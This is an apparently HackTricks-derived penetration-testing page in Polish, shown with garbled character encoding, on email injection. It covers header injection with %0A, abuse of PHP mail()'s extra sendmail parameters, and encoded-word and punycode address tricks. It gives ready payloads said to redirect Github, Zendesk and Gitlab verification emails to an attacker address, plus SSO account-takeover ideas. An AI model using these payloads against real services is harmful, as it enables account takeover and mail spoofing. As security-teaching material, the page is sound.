# WstrzykniÄ™cia e-mail

<figure><img src="../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=email-injections), aby Å‚atwo budowaÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** zasilane przez **najbardziej zaawansowane** narzÄ™dzia spoÅ‚ecznoÅ›ciowe na Å›wiecie.\
Uzyskaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=email-injections" %}

{{#include ../banners/hacktricks-training.md}}

## Wstrzykiwanie w wysÅ‚anym e-mailu

### Wstrzykiwanie Cc i Bcc po argumencie nadawcy
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
WiadomoÅ›Ä‡ zostanie wysÅ‚ana do kont odbiorcy i odbiorcy1.

### Wstrzyknij argument
```
From:sender@domain.com%0ATo:attacker@domain.com
```
WiadomoÅ›Ä‡ zostanie wysÅ‚ana do oryginalnego odbiorcy oraz konta atakujÄ…cego.

### Wstrzykiwanie argumentu Subject
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
FaÅ‚szywy temat zostanie dodany do oryginalnego tematu, a w niektÃ³rych przypadkach go zastÄ…pi. ZaleÅ¼y to od zachowania usÅ‚ugi pocztowej.

### ZmieÅ„ treÅ›Ä‡ wiadomoÅ›ci

Wstrzyknij dwa znaki nowej linii, a nastÄ™pnie napisz swojÄ… wiadomoÅ›Ä‡, aby zmieniÄ‡ treÅ›Ä‡ wiadomoÅ›ci.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### Wykorzystanie funkcji PHP mail()
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### 5. parametr ($additional_parameters)

Ta sekcja bÄ™dzie oparta na **tym, jak naduÅ¼yÄ‡ ten parametr, zakÅ‚adajÄ…c, Å¼e atakujÄ…cy go kontroluje**.

Ten parametr zostanie dodany do linii poleceÅ„, ktÃ³rÄ… PHP bÄ™dzie uÅ¼ywaÄ‡ do wywoÅ‚ania binarnego sendmail. Zostanie jednak oczyszczony za pomocÄ… funkcji `escapeshellcmd($additional_parameters)`.

AtakujÄ…cy moÅ¼e **wstrzyknÄ…Ä‡ dodatkowe parametry dla sendmail** w tym przypadku.

#### RÃ³Å¼nice w implementacji /usr/sbin/sendmail

Interfejs **sendmail** jest **dostarczany przez oprogramowanie MTA email** (Sendmail, Postfix, Exim itp.) zainstalowane w systemie. ChociaÅ¼ **podstawowa funkcjonalnoÅ›Ä‡** (taka jak parametry -t -i -f) pozostaje **taka sama** z powodÃ³w zgodnoÅ›ci, **inne funkcje i parametry** znacznie siÄ™ rÃ³Å¼niÄ… w zaleÅ¼noÅ›ci od zainstalowanego MTA.

Oto kilka przykÅ‚adÃ³w rÃ³Å¼nych stron podrÄ™cznika poleceÅ„ dla interfejsu sendmail:

- Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
- Postfix MTA: http://www.postfix.org/mailq.1.html
- Exim MTA: https://linux.die.net/man/8/eximReferences

W zaleÅ¼noÅ›ci od **pochodzenia binarnego sendmail** odkryto rÃ³Å¼ne opcje, aby je naduÅ¼yÄ‡ i **wyciekowaÄ‡ pliki lub nawet wykonywaÄ‡ dowolne polecenia**. SprawdÅº jak w [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## Wstrzykiwanie w nazwÄ™ e-mail

> [!CAUTION]
> ZauwaÅ¼, Å¼e jeÅ›li uda ci siÄ™ zaÅ‚oÅ¼yÄ‡ konto w usÅ‚udze z dowolnÄ… nazwÄ… domeny (takÄ… jak Github, Gitlab, CloudFlare Zero trust...) i zweryfikowaÄ‡ je, otrzymujÄ…c e-mail weryfikacyjny na swÃ³j adres e-mail, moÅ¼esz uzyskaÄ‡ dostÄ™p do wraÅ¼liwych lokalizacji firmy ofiary.

### Ignorowane czÄ™Å›ci e-maila

Symbole: **+, -** i **{}** w rzadkich przypadkach mogÄ… byÄ‡ uÅ¼ywane do tagowania i sÄ… ignorowane przez wiÄ™kszoÅ›Ä‡ serwerÃ³w e-mail.

- Np. john.doe+intigriti@example.com â†’ john.doe@example.com

**Komentarze w nawiasach ()** na poczÄ…tku lub na koÅ„cu rÃ³wnieÅ¼ bÄ™dÄ… ignorowane.

- Np. john.doe(intigriti)@example.com â†’ john.doe@example.com

### OminiÄ™cie biaÅ‚ej listy

<figure><img src="../images/image (812).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### Cytaty

<figure><img src="../images/image (626).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### IP

MoÅ¼esz rÃ³wnieÅ¼ uÅ¼ywaÄ‡ adresÃ³w IP jako nazw domenowych w nawiasach kwadratowych:

- john.doe@\[127.0.0.1]
- john.doe@\[IPv6:2001:db8::1]

### Kodowanie e-maili

Jak wyjaÅ›niono w [**tych badaniach**](https://portswigger.net/research/splitting-the-email-atom), nazwy e-maili mogÄ… rÃ³wnieÅ¼ zawieraÄ‡ zakodowane znaki:

- **PHP 256 overflow**: Funkcja PHP `chr` bÄ™dzie nadal dodawaÄ‡ 256 do znaku, aÅ¼ stanie siÄ™ dodatnia, a nastÄ™pnie wykona operacjÄ™ `%256`.
- `String.fromCodePoint(0x10000 + 0x40) // ğ€ â†’ @`

> [!TIP]
> Celem tego triku jest zakoÅ„czenie wstrzykniÄ™ciem takim jak `RCPT TO:<"collab@psres.net>collab"@example.com>`\
> co spowoduje wysÅ‚anie e-maila weryfikacyjnego na inny adres e-mail niÅ¼ oczekiwany (w ten sposÃ³b wprowadza siÄ™ inny adres e-mail wewnÄ…trz nazwy e-mail i Å‚amie skÅ‚adniÄ™ podczas wysyÅ‚ania e-maila).

RÃ³Å¼ne kodowania:
```bash
# Format
=? utf-8 ? q ? =41=42=43 ?= hi@example.com --> ABChi@example.com

# =? -> Start of encode
# utf-8 -> encoding used
# ? -> separator
# q -> type of encoding
# ? -> separator
# =41=42=43 -> Hex encoded data
# ?= end of encoding

# Other encodings, same example:
#Â iso-8859-1
=?iso-8859-1?q?=61=62=63?=hi@example.com
# utf-8
=?utf-8?q?=61=62=63?=hi@example.com
# utf-7
=?utf-7?q?<utf-7 encoded string>?=hi@example.com
# q encoding + utf-7
=?utf-7?q?&=41<utf-7 encoded string without initial A>?=hi@example.com
# base64
=?utf-8?b?QUJD?=hi@example.com
# bas64 + utf-7
=?utf-7?q?<utf-7 encoded string in base64>?=hi@example.com
#punycode
x@xn--svg/-9x6 â†’ x@<svg/
```
Payloads:

- Github: `=?x?q?collab=40psres.net=3e=00?=foo@example.com`
- ZauwaÅ¼ zakodowane `@` jako =40, zakodowane `>` jako `=3e` i `null` jako `=00`&#x20;
- WyÅ›le wiadomoÅ›Ä‡ weryfikacyjnÄ… na `collab@psres.net`
- Zendesk: `"=?x?q?collab=22=40psres.net=3e=00==3c22x?="@example.com`
- Ta sama sztuczka co wczeÅ›niej, ale dodajÄ…c zwykÅ‚y cudzysÅ‚Ã³w na poczÄ…tku i zakodowany cudzysÅ‚Ã³w `=22` przed zakodowanym `@`, a nastÄ™pnie otwierajÄ…c i zamykajÄ…c cudzysÅ‚owy przed nastÄ™pnym adresem e-mail, aby naprawiÄ‡ skÅ‚adniÄ™ uÅ¼ywanÄ… wewnÄ™trznie przez Zendesk
- WyÅ›le wiadomoÅ›Ä‡ weryfikacyjnÄ… na `collab@psres.net`
- Gitlab: `=?x?q?collab=40psres.net_?=foo@example.com`
- ZauwaÅ¼ uÅ¼ycie podkreÅ›lenia jako spacji do oddzielenia adresu
- WyÅ›le wiadomoÅ›Ä‡ weryfikacyjnÄ… na `collab@psres.net`
- Punycode: UÅ¼ywajÄ…c Punycode, moÅ¼liwe byÅ‚o wstrzykniÄ™cie tagu `<style` w Joomla i naduÅ¼ycie go do kradzieÅ¼y tokenu CSRF za pomocÄ… eksfiltracji CSS.

#### Tooling

- Istnieje **skrypt Burp Suite Turbo Intruder**, aby fuzzowaÄ‡ tego rodzaju kombinacje, aby sprÃ³bowaÄ‡ zaatakowaÄ‡ formaty e-maili. Skrypt ma juÅ¼ potencjalnie dziaÅ‚ajÄ…ce kombinacje.
- MoÅ¼liwe jest rÃ³wnieÅ¼ uÅ¼ycie [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) do stworzenia ataku dzielÄ…cego e-mail

### Inne luki

![https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0](<../images/image (1131).png>)

## SSO stron trzecich

### XSS

NiektÃ³re usÅ‚ugi, takie jak **github** lub **salesforce**, pozwalajÄ… na stworzenie **adresu e-mail z Å‚adunkami XSS**. JeÅ›li moÅ¼esz **uÅ¼yÄ‡ tych dostawcÃ³w do logowania siÄ™ do innych usÅ‚ug** i te usÅ‚ugi **nie sanitizujÄ…** poprawnie e-maila, moÅ¼esz spowodowaÄ‡ **XSS**.

### PrzejÄ™cie konta

JeÅ›li **usÅ‚uga SSO** pozwala na **utworzenie konta bez weryfikacji podanego adresu e-mail** (jak **salesforce**) i nastÄ™pnie moÅ¼esz uÅ¼yÄ‡ tego konta do **logowania siÄ™ w innej usÅ‚udze**, ktÃ³ra **ufa** salesforce, moÅ¼esz uzyskaÄ‡ dostÄ™p do dowolnego konta.\
&#xNAN;_&#x4E;ote, Å¼e salesforce wskazuje, czy podany e-mail byÅ‚ weryfikowany, ale aplikacja powinna wziÄ…Ä‡ pod uwagÄ™ te informacje._

## OdpowiedÅº do

MoÅ¼esz wysÅ‚aÄ‡ e-mail uÅ¼ywajÄ…c _**From: company.com**_ i _**Replay-To: attacker.com**_, a jeÅ›li jakakolwiek **automatyczna odpowiedÅº** zostanie wysÅ‚ana z powodu tego, Å¼e e-mail zostaÅ‚ wysÅ‚any **z** **wewnÄ™trznego adresu**, **atakujÄ…cy** moÅ¼e byÄ‡ w stanie **otrzymaÄ‡** tÄ™ **odpowiedÅº**.

## WskaÅºnik twardych odbiÄ‡

NiektÃ³re usÅ‚ugi, takie jak AWS, implementujÄ… prÃ³g znany jako **WskaÅºnik twardych odbiÄ‡**, zazwyczaj ustawiony na 10%. To krytyczna metryka, szczegÃ³lnie dla usÅ‚ug dostarczania e-maili. Gdy ten wskaÅºnik zostanie przekroczony, usÅ‚uga, taka jak usÅ‚uga e-mailowa AWS, moÅ¼e zostaÄ‡ zawieszona lub zablokowana.

**Twarde odbicie** odnosi siÄ™ do **e-maila**, ktÃ³ry zostaÅ‚ zwrÃ³cony do nadawcy, poniewaÅ¼ adres odbiorcy jest nieprawidÅ‚owy lub nieistniejÄ…cy. MoÅ¼e to wystÄ…piÄ‡ z rÃ³Å¼nych powodÃ³w, takich jak **e-mail** wysÅ‚any na nieistniejÄ…cy adres, domenÄ™, ktÃ³ra nie jest rzeczywista, lub odmowa serwera odbiorcy przyjÄ™cia **e-maili**.

W kontekÅ›cie AWS, jeÅ›li wyÅ›lesz 1000 e-maili, a 100 z nich skutkuje twardymi odbiciami (z powodu takich powodÃ³w jak nieprawidÅ‚owe adresy lub domeny), oznacza to wskaÅºnik twardych odbiÄ‡ na poziomie 10%. OsiÄ…gniÄ™cie lub przekroczenie tego wskaÅºnika moÅ¼e spowodowaÄ‡ zablokowanie lub zawieszenie moÅ¼liwoÅ›ci wysyÅ‚ania e-maili przez AWS SES (Simple Email Service).

WaÅ¼ne jest, aby utrzymaÄ‡ niski wskaÅºnik twardych odbiÄ‡, aby zapewniÄ‡ nieprzerwanÄ… usÅ‚ugÄ™ e-mailowÄ… i utrzymaÄ‡ reputacjÄ™ nadawcy. Monitorowanie i zarzÄ…dzanie jakoÅ›ciÄ… adresÃ³w e-mail w twoich listach mailingowych moÅ¼e znaczÄ…co pomÃ³c w osiÄ…gniÄ™ciu tego celu.

Aby uzyskaÄ‡ bardziej szczegÃ³Å‚owe informacje, moÅ¼na odwoÅ‚aÄ‡ siÄ™ do oficjalnej dokumentacji AWS dotyczÄ…cej obsÅ‚ugi odbiÄ‡ i skarg [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types).

## Odniesienia

- [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
- [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
- [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
- [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0)

{{#include ../banners/hacktricks-training.md}}

<figure><img src="../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=email-injections), aby Å‚atwo budowaÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** zasilane przez **najbardziej zaawansowane** narzÄ™dzia spoÅ‚ecznoÅ›ci.\
Uzyskaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=email-injections" %}
